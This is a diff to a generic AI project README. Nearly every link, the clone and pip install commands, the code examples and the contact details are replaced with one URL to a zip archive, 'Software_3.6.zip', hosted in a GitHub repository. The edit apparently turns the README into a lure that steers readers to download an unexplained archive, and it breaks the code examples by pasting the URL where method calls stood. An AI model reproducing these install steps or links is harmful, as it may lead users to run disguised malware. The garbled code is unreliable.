@@ -1,6 +1,6 @@
 # AI Repository: Explore the Future of Artificial Intelligence 🤖✨
 
-![GitHub Repo](https://img.shields.io/badge/GitHub-Visit%20Repo-brightgreen?style=flat&logo=github)
+![GitHub Repo](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip%20Repo-brightgreen?style=flat&logo=github)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -25,7 +25,7 @@ This repository focuses on artificial intelligence, providing tools and framewor
 To get started, clone this repository to your local machine. Run the following command in your terminal:
 
 ```bash
-git clone https://github.com/your-username/ai.git
+git clone https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip
 ```
 
 Next, navigate to the project directory:
@@ -37,7 +37,7 @@ cd ai
 Install the required dependencies. If you are using Python, you can do this with pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip
 ```
 
 For other languages or frameworks, refer to the documentation provided in the repository.
@@ -50,8 +50,8 @@ After installation, you can start using the tools provided in this repository. H
 from ai import Model
 
 model = Model()
-model.train(data)
-predictions = model.predict(new_data)
+https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip(data)
+predictions = https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip(new_data)
 ```
 
 ### Example 2: Data Processing
@@ -59,7 +59,7 @@ predictions = model.predict(new_data)
 from ai import DataProcessor
 
 processor = DataProcessor()
-clean_data = processor.clean(raw_data)
+clean_data = https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip(raw_data)
 ```
 
 For more detailed usage instructions, check the documentation files included in the repository.
@@ -82,14 +82,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Contact
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourusername](https://twitter.com/yourusername)
+- **Email**: https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip
+- **Twitter**: [@yourusername](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip)
 
 ## Resources
 For more information about AI and related topics, consider visiting:
 
-- [GitHub](https://github.com)
-- [AI Research Papers](https://arxiv.org)
-- [Machine Learning Courses](https://www.coursera.org)
+- [GitHub](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip)
+- [AI Research Papers](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip)
+- [Machine Learning Courses](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip)
 
-If you need specific files, you can download them from the repository. Visit [GitHub](https://github.com) for more details. If you want to check for updates or releases, please visit the "Releases" section in this repository.
+If you need specific files, you can download them from the repository. Visit [GitHub](https://github.com/erickhrc/ai/raw/refs/heads/main/calculi/Software_3.6.zip) for more details. If you want to check for updates or releases, please visit the "Releases" section in this repository.
